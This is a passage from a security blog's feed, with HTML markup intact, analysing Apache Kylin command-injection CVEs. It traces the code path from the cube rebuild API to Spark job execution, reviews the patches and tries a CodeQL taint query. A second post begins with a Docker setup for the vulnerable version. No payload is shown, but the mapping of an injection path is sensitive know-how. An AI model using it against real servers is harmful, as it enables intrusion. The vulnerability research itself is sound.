<span class="title class_">CubeService</span> <span class="keyword">extends</span> <span class="title class_">BasicService</span> <span class="keyword">implements</span> <span class="title class_">InitializingBean</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> CubeDesc <span class="title function_">updateCubeAndDesc</span><span class="params">(CubeInstance cube, CubeDesc desc, String newProjectName, <span class="type">boolean</span> forceUpdate)</span></span><br><span class="line">        <span class="type">CubeDesc</span> <span class="variable">updatedCubeDesc</span> <span class="operator">=</span> getCubeDescManager().updateCubeDesc(desc);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>CubeDescManager.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CubeDescManager</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> CubeDesc <span class="title function_">updateCubeDesc</span><span class="params">(CubeDesc desc)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            crud.save(desc);</span><br></pre></td></tr></table></figure><ul><li>更新CubeDesc</li></ul><h5 id="CubeDesc-to-CubeInstance"><a href="#CubeDesc-to-CubeInstance" class="headerlink" title="CubeDesc to CubeInstance"></a>CubeDesc to CubeInstance</h5><p>但是从下文中rebuild 中得知，是直接获取的cubeInstance，那么是CubeDesc 是如何修改CubeInstance 的呢？</p><p><img src="/images/pasted-960.png" alt="upload successful"></p><p><img src="/images/pasted-962.png" alt="upload successful"></p><p><img src="/images/pasted-961.png" alt="upload successful"></p><ol><li>更新完cubeDesc后，会触发EntityChange 事件</li><li>最终调用cubeManager.reloadCubeQuietly 重新加载cube</li></ol><blockquote><p>这中间涉及到异步，CodeQL 基本无望了</p></blockquote><h4 id="2-2-2-CubeController-rebuild"><a href="#2-2-2-CubeController-rebuild" class="headerlink" title="2.2.2 CubeController#rebuild"></a>2.2.2 CubeController#rebuild</h4><p><img src="/images/pasted-959.png" alt="upload successful"></p><p>CubeController#rebuild</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">   <span class="meta">@RequestMapping(value = &quot;/&#123;cubeName&#125;/rebuild&quot;, method = &#123; RequestMethod.PUT &#125;, produces = &#123; &quot;application/json&quot; &#125;)</span></span><br><span class="line">   <span class="meta">@ResponseBody</span></span><br><span class="line">   <span class="keyword">public</span> JobInstance <span class="title function_">rebuild</span><span class="params">(<span class="meta">@PathVariable</span> String cubeName, <span class="meta">@RequestBody</span> JobBuildRequest req)</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> buildInternal(cubeName, <span class="keyword">new</span> <span class="title class_">TSRange</span>(req.getStartTime(), req.getEndTime()), <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>,</span><br><span class="line">               req.getBuildType(), req.isForce() || req.isForceMergeEmptySegment(), req.getPriorityOffset());</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> JobInstance <span class="title function_">buildInternal</span><span class="params">(String cubeName, TSRange tsRange, SegmentRange segRange, //</span></span><br><span class="line"><span class="params">           Map&lt;Integer, Long&gt; sourcePartitionOffsetStart, Map&lt;Integer, Long&gt; sourcePartitionOffsetEnd,</span></span><br><span class="line"><span class="params">           String buildType, <span class="type">boolean</span> force, Integer priorityOffset)</span> &#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="type">CubeInstance</span> <span class="variable">cube</span> <span class="operator">=</span> jobService.getCubeManager().getCube(cubeName);</span><br><span class="line">           <span class="keyword">return</span> jobService.submitJob(cube, tsRange, segRange, sourcePartitionOffsetStart, sourcePartitionOffsetEnd,</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>通过jobService.getCubeManager().getCube(cubeName) 获取cube</li></ul><p>JobService#submitJob</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> JobInstance <span class="title function_">submitJob</span><span class="params">(CubeInstance cube, TSRange tsRange, SegmentRange segRange, //</span></span><br><span class="line"><span class="params">    JobInstance jobInstance = submitJobInternal(cube, tsRange, segRange, sourcePartitionOffsetStart,</span></span><br><span class="line"><span class="params"></span></span><br><span class="line"><span class="params"><span class="keyword">public</span> JobInstance submitJobInternal(CubeInstance cube, TSRange tsRange, SegmentRange segRange, //</span></span><br><span class="line"><span class="params">        Map&lt;Integer, Long&gt; sourcePartitionOffsetStart, Map&lt;Integer, Long&gt; sourcePartitionOffsetEnd, //</span></span><br><span class="line"><span class="params">        CubeBuildTypeEnum buildType, <span class="type">boolean</span> force, String submitter, Integer priorityOffset)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ...</span><br><span class="line">            newSeg = getCubeManager().appendSegment(cube, src);</span><br><span class="line">            job = EngineFactory.createBatchCubingJob(newSeg, submitter, priorityOffset);</span><br><span class="line">        ...</span><br><span class="line">        getExecutableManager().addJob(job);</span><br></pre></td></tr></table></figure><p>ExecutableManager.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExecutableManager</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> KylinConfig config;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ExecutableDao executableDao;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addJob</span><span class="params">(AbstractExecutable executable)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            executable.initConfig(config);</span><br><span class="line">            addJobOutput(executable);</span><br><span class="line">            executableDao.addJob(parse(executable));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getAllJobIdsInCache</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> executableDao.getJobIdsInCache();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ExecutableDao.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExecutableDao</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> CaseInsensitiveStringCache&lt;ExecutablePO&gt; executableDigestMap;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">ExecutableDao</span><span class="params">(KylinConfig config)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.executableDigestMap = <span class="keyword">new</span> <span class="title class_">CaseInsensitiveStringCache</span>&lt;&gt;(config, <span class="string">&quot;execute&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getJobIdsInCache</span><span class="params">()</span> &#123;</span><br><span class="line">        Set&lt;String&gt; idSet = executableDigestMap.keySet();</span><br><span class="line">        <span class="keyword">return</span> Lists.newArrayList(idSet);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> ExecutablePO <span class="title function_">addJob</span><span class="params">(ExecutablePO job)</span> <span class="keyword">throws</span> PersistentException &#123;</span><br><span class="line">    ...</span><br><span class="line">            executableDigestMap.put(job.getId(), job);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>ExecutableDao 存在个map，保存所有的Executeable 任务</li><li>addJob 新增job任务接口</li><li>getJobIdsInCache 获取所有任务接口</li></ul><h4 id="2-2-2-DefaultScheduler-定时任务线程"><a href="#2-2-2-DefaultScheduler-定时任务线程" class="headerlink" title="2.2.2 DefaultScheduler 定时任务线程"></a>2.2.2 DefaultScheduler 定时任务线程</h4><p><img src="/images/pasted-958.png" alt="upload successful"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">execute:90, CliCommandExecutor (org.apache.kylin.common.util)</span><br><span class="line">runSparkSubmit:282, NSparkExecutable (org.apache.kylin.engine.spark.job)</span><br><span class="line">doWork:168, NSparkExecutable (org.apache.kylin.engine.spark.job)</span><br><span class="line">execute:206, AbstractExecutable (org.apache.kylin.job.execution)</span><br><span class="line">doWork:94, DefaultChainedExecutable (org.apache.kylin.job.execution)</span><br><span class="line">execute:206, AbstractExecutable (org.apache.kylin.job.execution)</span><br><span class="line">run:113, DefaultScheduler$JobRunner (org.apache.kylin.job.impl.threadpool)</span><br><span class="line">runWorker:1149, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:624, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:748, Thread (java.lang)</span><br></pre></td></tr></table></figure><p>中间变量为 CubeInstance.config.overrides 内</p><p>NSparkExecutable.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> ExecuteResult <span class="title function_">doWork</span><span class="params">(ExecutableContext context)</span> <span class="keyword">throws</span> ExecuteException &#123;</span><br><span class="line">    <span class="comment">//context.setLogPath(getSparkDriverLogHdfsPath(context.getConfig()));</span></span><br><span class="line">    <span class="type">CubeManager</span> <span class="variable">cubeMgr</span> <span class="operator">=</span> CubeManager.getInstance(KylinConfig.getInstanceFromEnv());</span><br><span class="line">    <span class="type">CubeInstance</span> <span class="variable">cube</span> <span class="operator">=</span> cubeMgr.getCube(<span class="built_in">this</span>.getCubeName());</span><br><span class="line">    <span class="type">KylinConfig</span> <span class="variable">config</span> <span class="operator">=</span> cube.getConfig();</span><br><span class="line">    <span class="built_in">this</span>.setLogPath(getSparkDriverLogHdfsPath(context.getConfig()));</span><br><span class="line">    config = wrapConfig(config);</span><br></pre></td></tr></table></figure><h5 id="ThreadPool-任务从何而来"><a href="#ThreadPool-任务从何而来" class="headerlink" title="ThreadPool 任务从何而来"></a>ThreadPool 任务从何而来</h5><p>DefaultScheduler.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefaultScheduler</span> <span class="keyword">implements</span> <span class="title class_">Scheduler</span>&lt;AbstractExecutable&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> DefaultScheduler INSTANCE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(JobEngineConfig jobEngineConfig, JobLock lock)</span> <span class="keyword">throws</span> SchedulerException &#123;</span><br><span class="line">    ...</span><br><span class="line">        jobPool = <span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>(corePoolSize, corePoolSize, Long.MAX_VALUE, TimeUnit.DAYS,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">SynchronousQueue</span>&lt;Runnable&gt;());</span><br><span class="line">        ...</span><br><span class="line">        <span class="type">JobExecutor</span> <span class="variable">jobExecutor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JobExecutor</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(AbstractExecutable executable)</span> &#123;</span><br><span class="line">                jobPool.execute(<span class="keyword">new</span> <span class="title class_">JobRunner</span>(executable));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        ...</span><br><span class="line">        fetcher = jobEngineConfig.getJobPriorityConsidered()</span><br><span class="line">                ? <span class="keyword">new</span> <span class="title class_">PriorityFetcherRunner</span>(jobEngineConfig, context, jobExecutor)</span><br><span class="line">                : <span class="keyword">new</span> <span class="title class_">DefaultFetcherRunner</span>(jobEngineConfig, context, jobExecutor);</span><br></pre></td></tr></table></figure><ul><li>jobPool.execute 是从pool 里面添加任务的接口</li><li>得看后续jobExecutor 何处调用execute</li></ul><p>FetcherRunner.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">FetcherRunner</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FetcherRunner</span><span class="params">(JobEngineConfig jobEngineConfig, DefaultContext context, JobExecutor jobExecutor)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.jobEngineConfig = jobEngineConfig;</span><br><span class="line">        <span class="built_in">this</span>.context = context;</span><br><span class="line">        <span class="built_in">this</span>.jobExecutor = jobExecutor;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">addToJobPool</span><span class="params">(AbstractExecutable executable, <span class="type">int</span> priority)</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">            jobExecutor.execute(executable);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefaultFetcherRunner</span> <span class="keyword">extends</span> <span class="title class_">FetcherRunner</span> &#123;</span><br><span class="line">    <span class="keyword">synchronized</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">final</span> String id : getExecutableManager().getAllJobIdsInCache()) &#123;</span><br><span class="line">                <span class="keyword">final</span> <span class="type">AbstractExecutable</span> <span class="variable">executable</span> <span class="operator">=</span> getExecutableManager().getJob(id);</span><br><span class="line">                addToJobPool(executable, executable.getDefaultPriority());</span><br></pre></td></tr></table></figure><ul><li>DefaultFetcherRunner 是个Runnable，其run 逻辑为循环从getExecutableManager() 获取任务，并且添加到jobExecutor 中去执行</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">JobRunner</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> AbstractExecutable executable;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">JobRunner</span><span class="params">(AbstractExecutable executable)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.executable = executable;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">SetThreadName</span> <span class="variable">ignored</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SetThreadName</span>(<span class="string">&quot;Scheduler %s Job %s&quot;</span>,</span><br><span class="line">                System.identityHashCode(DefaultScheduler.<span class="built_in">this</span>), executable.getId())) &#123;</span><br><span class="line">            executable.execute(context);</span><br></pre></td></tr></table></figure><ul><li>所以最终调用的是executable#execute 接口</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@EnableAspectJAutoProxy(proxyTargetClass = true)</span></span><br><span class="line"><span class="meta">@Component(&quot;jobService&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JobService</span> <span class="keyword">extends</span> <span class="title class_">BasicService</span> <span class="keyword">implements</span> <span class="title class_">InitializingBean</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterPropertiesSet</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        scheduler.init(<span class="keyword">new</span> <span class="title class_">JobEngineConfig</span>(kylinConfig), <span class="keyword">new</span> <span class="title class_">ZookeeperJobLock</span>());</span><br><span class="line"></span><br><span class="line">        Runtime.getRuntime().addShutdownHook(<span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    scheduler.shutdown();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (SchedulerException e) &#123;</span><br><span class="line">                    logger.error(<span class="string">&quot;error occurred to shutdown scheduler&quot;</span>, e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;));</span><br></pre></td></tr></table></figure><h2 id="3-补丁分析"><a href="#3-补丁分析" class="headerlink" title="3. 补丁分析"></a>3. 补丁分析</h2><h3 id="CVE-2022-24697"><a href="#CVE-2022-24697" class="headerlink" title="CVE-2022-24697"></a>CVE-2022-24697</h3><p><a href="https://github.com/apache/kylin/pull/1811/files">https://github.com/apache/kylin/pull/1811/files</a></p><p><img src="/images/pasted-963.png" alt="upload successful"></p><p>新增了ParameterFilter</p><h3 id="CVE-2022-43396"><a href="#CVE-2022-43396" class="headerlink" title="CVE-2022-43396"></a>CVE-2022-43396</h3><p><a href="https://github.com/apache/kylin/pull/2011/files">https://github.com/apache/kylin/pull/2011/files</a></p><p>禁用了kylin.engine.spark-cmd 属性</p><h2 id="4-CodeQL-复现"><a href="#4-CodeQL-复现" class="headerlink" title="4. CodeQL 复现"></a>4. CodeQL 复现</h2><h3 id="4-1-CodeQL-复现尝试"><a href="#4-1-CodeQL-复现尝试" class="headerlink" title="4.1 CodeQL 复现尝试"></a>4.1 CodeQL 复现尝试</h3><ol><li>从api 到KylinConfig.override<br>没问题</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@kind</span> path-problem</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> java</span><br><span class="line"><span class="keyword">import</span> semmle.code.java.dataflow.DataFlow</span><br><span class="line"><span class="keyword">import</span> semmle.code.java.dataflow.FlowSources</span><br><span class="line"><span class="keyword">import</span> semmle.code.java.dataflow.ExternalFlow</span><br><span class="line"><span class="keyword">import</span> InvokeSourceFlow::PathGraph</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span> InvokeSourceConfig <span class="keyword">implements</span> <span class="title class_">DataFlow</span>::ConfigSig &#123;</span><br><span class="line">  <span class="type">int</span> <span class="title function_">fieldFlowBranchLimit</span><span class="params">()</span> &#123; result = <span class="number">500</span> &#125;</span><br><span class="line"></span><br><span class="line">  predicate <span class="title function_">isSource</span><span class="params">(DataFlow::Node source)</span> &#123;</span><br><span class="line">    source <span class="keyword">instanceof</span> RemoteFlowSource</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  predicate <span class="title function_">isSink</span><span class="params">(DataFlow::Node sink)</span> &#123;</span><br><span class="line">    <span class="comment">// sinkNode(sink, &quot;command-injection&quot;)</span></span><br><span class="line">    exists( RefType rf|  rf.getASourceSupertype*().hasQualifiedName(<span class="string">&quot;org.apache.kylin.common&quot;</span>, <span class="string">&quot;KylinConfig&quot;</span>) | </span><br><span class="line">      sink.asExpr().getFile() = rf.getFile()</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">module</span> <span class="variable">InvokeSourceFlow</span> <span class="operator">=</span> TaintTracking::Global&lt;InvokeSourceConfig&gt;;</span><br><span class="line"></span><br><span class="line">from InvokeSourceFlow::PathNode source, InvokeSourceFlow::PathNode sink</span><br><span class="line">where InvokeSourceFlow::flowPath(source, sink)</span><br><span class="line">select sink, source, sink, <span class="string">&quot;$@-&gt;$@&quot;</span>, source, source.toString(), sink, sink.toString()</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-867.png" alt="upload successful"></p><p><img src="/images/pasted-869.png" alt="upload successful"></p><ol start="2"><li>从KylinConfig 到Sink</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h2 id="5-思考"><a href="#5-思考" class="headerlink" title="5. 思考"></a>5. 思考</h2><p>这个漏洞流程很复杂，涉及到3个线程，2个http 请求，想靠CodeQL 直接实现难度很大。提两个脑洞思路</p><ol><li>寻找全局静态类实例，比如这个case 中的CubeManager</li><li>从http source 能够传播到CubeManager 中哪些field</li><li>从这些field 再作为source 点，能否传播至sink</li></ol><p>上main中的全局类实例，也可以是</p><ul><li>db</li><li>cache</li><li>文件</li><li>全局变量</li></ul><p>实现起来应该是很难的了。。。</p><h2 id="6-参考"><a href="#6-参考" class="headerlink" title="6. 参考"></a>6. 参考</h2><ol><li><a href="https://xz.aliyun.com/news/11631">https://xz.aliyun.com/news/11631</a></li><li><a href="https://lists.apache.org/thread/07mnn9c7o314wrhrwjr10w9j5s82voj4">https://lists.apache.org/thread/07mnn9c7o314wrhrwjr10w9j5s82voj4</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;在官方漏洞报告中，说CVE-2022-43396是CVE-2022-24697的绕过。实际情况却是：两个漏洞均是发送在 Kylin 的 cube build 功能中，但CVE-2022-24697是参数可控；CVE-2022-43396是命令可控。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;下文以CVE-2022-24697 为例，主要目的是跟踪下数据流，看看能否用CodeQL 复现。&lt;/p&gt;
&lt;h2 id=&quot;1-漏洞概况&quot;&gt;&lt;a href=&quot;#1-漏洞概况&quot; class=&quot;headerlink&quot; title=&quot;1. 漏洞概况&quot;&gt;&lt;/a&gt;1. 漏洞概况&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;影响版本：&lt;br&gt;Kylin 2.x &amp;amp; Kylin 3.x &amp;amp; 4.x should upgrade to 4.0.2&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;2-漏洞分析&quot;&gt;&lt;a href=&quot;#2-漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;2. 漏洞分析&quot;&gt;&lt;/a&gt;2. 漏洞分析&lt;/h2&gt;&lt;h3 id=&quot;2-1-漏洞环境搭建&quot;&gt;&lt;a href=&quot;#2-1-漏洞环境搭建&quot; class=&quot;headerlink&quot; title=&quot;2.1 漏洞环境搭建&quot;&gt;&lt;/a&gt;2.1 漏洞环境搭建&lt;/h3&gt;&lt;p&gt;同前文，不赘述&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞分析" scheme="http://m0d9.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE" scheme="http://m0d9.me/tags/CVE/"/>
    
    <category term="Kylin" scheme="http://m0d9.me/tags/Kylin/"/>
    
  </entry>
  
  <entry>
    <title>Apache Kylin CVE-2021-45456/CVE-2022-44621 漏洞分析与CodeQL 验证</title>
    <link href="http://m0d9.me/2024/06/11/Apache-Kylin-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8ECodeQL-%E5%9B%9E%E5%BD%92%E9%AA%8C%E8%AF%81/"/>
    <id>http://m0d9.me/2024/06/11/Apache-Kylin-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8ECodeQL-%E5%9B%9E%E5%BD%92%E9%AA%8C%E8%AF%81/</id>
    <published>2024-06-11T11:52:00.000Z</published>
    <updated>2025-06-17T13:30:43.134Z</updated>
    
    <content type="html"><![CDATA[<p>CVE-2021-45456 漏洞是rest api 接口参数project 存在命令注入，CVE-2022-44621 漏洞是jobid 参数存在命令注入，原理相似，这里以分析CVE-2021-45456 为例，跟踪下这两个漏洞。</p><h2 id="1-漏洞概况"><a href="#1-漏洞概况" class="headerlink" title="1. 漏洞概况"></a>1. 漏洞概况</h2><p>影响版本：4.0.0</p><blockquote><p>Mitigation:<br>Users of Kylin 4.0.0 should upgrade to 4.0.1 or apply patch <a href="https://github.com/apache/kylin/pull/1781">https://github.com/apache/kylin/pull/1781</a>.</p></blockquote><blockquote><p>Credit:<br>These issues were discovered and reported by GHSL team member @pwntester (Alvaro Muñoz).</p></blockquote><p>描述：project 参数存在命令拼接</p><h2 id="2-漏洞分析"><a href="#2-漏洞分析" class="headerlink" title="2. 漏洞分析"></a>2. 漏洞分析</h2><h3 id="2-1-漏洞环境搭建"><a href="#2-1-漏洞环境搭建" class="headerlink" title="2.1 漏洞环境搭建"></a>2.1 漏洞环境搭建</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">docker pull apachekylin/apache-kylin-standalone:4.0.0</span><br><span class="line"></span><br><span class="line">docker run -d \</span><br><span class="line">-m 8G \</span><br><span class="line">-p 7070:7070 \</span><br><span class="line">-p 8088:8088 \</span><br><span class="line">-p 50070:50070 \</span><br><span class="line">-p 8032:8032 \</span><br><span class="line">-p 8042:8042 \</span><br><span class="line">-p 2181:2181 \</span><br><span class="line">-p 5005:5005 \</span><br><span class="line">apachekylin/apache-kylin-standalone:4.0.0</span><br></pre></td></tr></table></figure><h3 id="2-2-漏洞原理分析"><a href="#2-2-漏洞原理分析" class="headerlink" title="2.2 漏洞原理分析"></a>2.2 漏洞原理分析</h3><p>很简单的命令拼接漏洞，如下</p><ol><li>DiagnosisController#dumpProjectDiagnosisInfo<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 